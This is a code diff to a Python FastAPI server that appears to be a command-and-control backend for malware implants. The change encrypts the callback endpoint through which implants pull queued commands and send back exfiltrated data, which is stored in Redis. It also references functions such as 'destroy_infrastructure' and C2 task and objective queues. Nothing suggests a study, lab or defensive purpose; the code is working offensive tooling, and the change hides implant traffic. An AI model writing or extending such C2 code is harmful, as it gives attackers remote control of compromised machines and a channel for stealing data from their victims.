@@ -897,6 +897,8 @@ async def destroy_infrastructure(
 
 
 # C2 Endpoints
+from .crypto import encrypt, decrypt
+
 class C2Task(BaseModel):
     agent_id: str
     command: str
@@ -904,6 +906,9 @@ class C2Task(BaseModel):
 class C2Objective(BaseModel):
     agent_id: str
     objective: str
+
+class EncryptedPayload(BaseModel):
+    data: str
 
 @app.post("/c2/task/queue", response_model=APIResponse)
 async def queue_c2_task(
@@ -945,26 +950,44 @@ async def set_c2_objective(
 
 @app.api_route("/c2/implant/callback", methods=["GET", "POST"])
 async def handle_c2_callback(request: Request):
-    """Handles beaconing and data exfiltration from implants."""
+    """Handles encrypted beaconing and data exfiltration from implants."""
     agent_id = request.headers.get("X-Agent-ID", "unknown_agent")
+    # TODO: Fetch key based on agent_id. Using default for now.
+    key = settings.C2_DEFAULT_ENCRYPTION_KEY.encode('utf-8')
 
     if request.method == "POST":
-        # Agent is sending back results
-        result_data = await request.json()
-        task_id = result_data.get("task_id")
-        output = result_data.get("output")
-        
-        # Store the result in Redis
-        await app.state.auth_manager.redis.set(f"c2:result:{task_id}", output, ex=3600) # Result expires in 1 hour
-        return Response(status_code=200)
+        # Agent is sending back encrypted results
+        try:
+            encrypted_payload = await request.json()
+            payload = EncryptedPayload(**encrypted_payload)
+            decrypted_data = decrypt(payload.data, key)
+            result_data = json.loads(decrypted_data)
+            
+            task_id = result_data.get("task_id")
+            output = result_data.get("output")
+            
+            # Store the result in Redis
+            await app.state.auth_manager.redis.set(f"c2:result:{task_id}", output, ex=3600) # Result expires in 1 hour
+            return Response(status_code=200)
+        except Exception as e:
+            logging.error(f"[C2_CALLBACK] Failed to process encrypted POST data: {e}")
+            raise HTTPException(status_code=400, detail="Invalid encrypted payload.")
 
     elif request.method == "GET":
         # Agent is asking for a task
         task_json = await app.state.auth_manager.redis.rpop(f"c2:tasks:{agent_id}")
         if task_json:
-            return JSONResponse(content=json.loads(task_json))
+            try:
+                encrypted_task = encrypt(task_json.encode('utf-8'), key)
+                payload = EncryptedPayload(data=encrypted_task)
+                return JSONResponse(content=payload.dict())
+            except Exception as e:
+                logging.error(f"[C2_CALLBACK] Failed to encrypt task: {e}")
+                # Push task back to queue if encryption fails
+                await app.state.auth_manager.redis.lpush(f"c2:tasks:{agent_id}", task_json)
+                raise HTTPException(status_code=500, detail="Task encryption failed.")
         else:
-            # No task, send back an empty command
+            # No task, send back an empty command (unencrypted, as per agent logic)
             return JSONResponse(content={"id": "", "command": ""})
 
 
